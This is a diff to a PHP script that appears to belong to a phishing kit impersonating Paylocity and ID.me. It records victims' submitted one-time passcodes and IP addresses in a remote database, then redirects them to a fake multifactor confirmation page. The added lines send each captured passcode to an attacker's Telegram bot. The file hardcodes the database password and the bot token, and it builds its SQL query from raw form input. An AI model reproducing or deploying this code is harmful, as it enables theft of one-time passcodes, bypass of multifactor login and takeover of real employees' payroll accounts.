@@ -1,11 +1,51 @@
 <?php
     $db = pg_connect("host=pg-paycity-paylocityhr0-25.l.aivencloud.com port=19042 dbname=defaultdb user=avnadmin password=AVNS_dOBPgbxmGoJJGAwr-yJ");
 
+
+// Telegram configuration
+    define('TELEGRAM_BOT_TOKEN', '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY');
+    define('TELEGRAM_CHAT_ID', '1325797388');
+
+
     $userotp=$_POST['userotp'];
 
 if ($_SERVER["REQUEST_METHOD"]=="POST"){
     $query = "INSERT INTO otp (userotp,time,ip) VALUES ('$_POST[userotp]',NOW(),'$_POST[ip]')";
     $result = pg_query($query);
+
+
+// Get and define form inputs
+    $userotp = htmlspecialchars($_POST['userotp'] ?? '? ? ?');
+    $ip = htmlspecialchars($_POST['ip'] ?? 'No ip');
+    $time = NOW();
+
+
+// Define message structure before sending to Telegram
+$telegram_message = "📝 *New OTP Submission*:\n\n".
+                    "👤 *Userotp:* $userotp\n".
+                    "  *Time:* $time\n".
+                    "💬 *IP:* $ip";
+                    
+
+$telegram_url = "https://api.telegram.org/bot".TELEGRAM_BOT_TOKEN."/sendMessage";
+
+// Send message using CURL (allows better error handling)
+$data = [
+    'chat_id' => TELEGRAM_CHAT_ID,
+    'text' => $telegram_message,
+    'parse_mode' => 'Markdown'
+];
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $telegram_url);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+$response = curl_exec($ch);
+curl_close($ch);
+
+
 
  header("Location:https://paylocity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php");
 exit;
